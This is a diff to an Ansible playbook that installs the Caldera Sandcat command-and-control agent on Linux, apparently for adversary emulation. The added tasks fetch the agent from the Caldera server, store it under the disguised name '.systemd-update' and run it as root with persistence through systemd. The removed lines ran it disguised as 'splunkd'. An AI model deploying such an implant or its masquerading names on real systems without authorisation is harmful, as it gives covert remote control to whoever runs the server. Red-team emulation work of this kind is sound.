@@ -1,16 +1,36 @@
 - name: Download Sandcat agent (Linux)
+  become: true
   get_url:
     url: "{{ caldera_server }}/file/download"
     dest: /usr/local/bin/.systemd-update
     mode: '0755'
     headers:
       file: sandcat.go
+      platform: linux
+      X-API-Key: "{{ caldera_api_key }}"
 
-- name: Run Sandcat agent
-  shell: >
-    nohup /usr/local/bin/splunkd
-    -server {{ caldera_server }}
-    -group {{ caldera_group }}
-    >/dev/null 2>&1 &
-  args:
-    creates: /var/run/splunkd.pid
+- name: Create Systemd service for Sandcat
+  become: true
+  copy:
+    dest: /etc/systemd/system/sandcat.service
+    content: |
+      [Unit]
+      Description=Caldera Sandcat Agent
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/usr/local/bin/.systemd-update -server {{ caldera_server }} -group {{ caldera_group }}
+      Restart=always
+      User=root
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Start and enable Sandcat service
+  become: true
+  systemd:
+    name: sandcat
+    enabled: yes
+    state: restarted
+    daemon_reload: yes
